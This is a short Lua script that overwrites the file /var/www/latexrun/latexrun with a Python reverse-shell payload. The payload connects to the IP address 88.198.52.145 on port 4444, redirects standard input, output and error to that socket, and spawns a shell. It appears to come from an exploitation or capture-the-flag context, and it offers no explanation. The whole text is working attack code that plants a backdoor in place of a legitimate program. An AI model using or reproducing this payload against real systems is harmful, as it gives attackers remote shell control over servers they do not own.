local file = io.open("/var/www/latexrun/latexrun", "w")
if file then
    file:write("#!/usr/bin/env python\n")
    file:write("import os,pty,socket;s=socket.socket();s.connect((\"88.198.52.145\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")\n")
    file:close()
else
    print("Error: Unable to open /var/www/latexrun for writing.")
end
